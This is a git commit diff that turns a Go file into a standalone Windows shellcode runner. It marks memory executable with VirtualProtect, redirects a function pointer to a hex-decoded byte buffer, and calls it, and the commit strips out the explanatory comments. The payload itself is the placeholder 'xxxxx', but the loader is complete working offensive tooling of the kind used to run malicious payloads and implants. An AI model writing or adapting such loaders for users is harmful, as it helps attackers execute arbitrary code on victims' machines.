1dc91dcaa9f68713758a1222e98e0f82ac6df7dd
小葵 <xi4okui@gmail.com>
2019-12-18 14:25:51 +0800

    Update shellcode_windows.go

--- shellcode_windows.go
+++ shellcode_windows.go
@@ -1,6 +1,7 @@
-package shellcode
+package main
 
 import (
+	"encoding/hex"
 	"syscall"
 	"unsafe"
 )
@@ -17,25 +18,21 @@ func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint3
 }
 
 func Run(sc []byte) {
-	// TODO need a Go safe fork
-	// Make a function ptr
 	f := func() {}
-
-	// Change permissions on f function ptr
 	var oldfperms uint32
 	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
 		panic("Call to VirtualProtect failed!")
 	}
-
-	// Override function ptr
 	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))
 
-	// Change permissions on shellcode string data
 	var oldshellcodeperms uint32
 	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
 		panic("Call to VirtualProtect failed!")
 	}
-
-	// Call the function ptr it
 	f()
+}
+
+func main() {
+	sc, _ := hex.DecodeString("xxxxx")
+	Run(sc)
 }
